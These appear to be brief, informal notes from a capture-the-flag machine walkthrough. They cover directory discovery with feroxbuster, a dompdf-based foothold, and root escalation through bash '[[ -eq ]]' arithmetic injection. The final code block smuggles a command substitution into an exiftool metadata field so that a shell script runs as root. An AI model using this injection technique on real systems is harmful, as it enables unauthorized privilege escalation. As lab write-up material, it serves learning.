it was on api so  use ==ferobuster== not gobuster as 404 will freak it out ...

directory finding was tough .. after that it was using ==dompdf== ..which we can exploit easily uk

we get shell

now it was using `[[ "$VAR" -eq "something" ]]`  in bash scripting

an dit is vulnerabel

```
touch test
exiftool -Producer='a[$(/dev/shm/uwu.sh)]+dompdf' test
put a bash shell in /dev/shm/uwu.sh 
and it give us shell  as root
```
